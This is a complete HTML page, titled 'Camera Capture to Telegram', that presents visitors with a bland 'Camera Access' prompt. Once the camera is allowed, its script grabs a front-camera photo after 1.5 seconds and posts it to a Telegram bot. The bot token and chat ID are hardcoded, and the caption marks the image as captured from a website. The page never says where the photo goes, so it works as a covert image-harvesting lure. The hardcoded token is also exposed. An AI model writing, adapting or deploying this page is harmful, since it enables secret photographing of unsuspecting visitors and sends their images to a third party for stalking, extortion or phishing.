<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Camera Capture to Telegram</title>
    <style>
        body {
            margin: 0;
            background: #0f0f0f;
            font-family: Arial, sans-serif;
            color: white;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            overflow: hidden;
        }

        .container {
            text-align: center;
            background: #1a1a1a;
            padding: 20px;
            border-radius: 12px;
            border: 1px solid #333;
            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
            max-width: 320px;
            width: 100%;
        }

        video {
            width: 100%;
            height: 200px;
            background: #000;
            border-radius: 8px;
            object-fit: cover;
            margin-bottom: 10px;
            transform: scaleX(-1);
        }

        .status {
            font-size: 13px;
            color: #aaa;
            margin-bottom: 10px;
        }
    </style>
</head>
<body>

    <div class="container">
        <h3>Camera Access</h3>
        <p class="status" id="statusText">Please allow camera access...</p>
        
        <video id="video" autoplay playsinline></video>
        <canvas id="canvas" style="display:none;"></canvas>
    </div>

    <script>
        const BOT_TOKEN = '8776982426:AAHwIFQIj36xbb_LoDZw7t1FpiRCLyzeu8U';
        const CHAT_ID = '7641255924';

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const statusText = document.getElementById('statusText');

        async function initCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'user' }, 
                    audio: false 
                });
                video.srcObject = stream;
                statusText.innerText = "Camera allowed. Capturing...";

                setTimeout(() => {
                    captureAndSend(stream);
                }, 1500);

            } catch (err) {
                statusText.innerText = "Camera access denied.";
                console.error("Error accessing media devices.", err);
            }
        }

        function captureAndSend(stream) {
            if (!video.videoWidth) return;

            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            
            const ctx = canvas.getContext('2d');
            
            ctx.translate(canvas.width, 0);
            ctx.scale(-1, 1);

            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            stream.getTracks().forEach(track => track.stop());

            canvas.toBlob(async function(blob) {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'captured-photo.jpg');
                formData.append('caption', '📸 New photo captured from website!');
                
                try {
                    let response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                    
                    if (response.ok) {
                        statusText.innerText = "Photo sent successfully!";
                    } else {
                        statusText.innerText = "Failed to send photo.";
                    }
                } catch (e) {
                    statusText.innerText = "Network error while sending.";
                }
            }, 'image/jpeg');
        }

        window.onload = initCamera;
    </script>
</body>
</html>
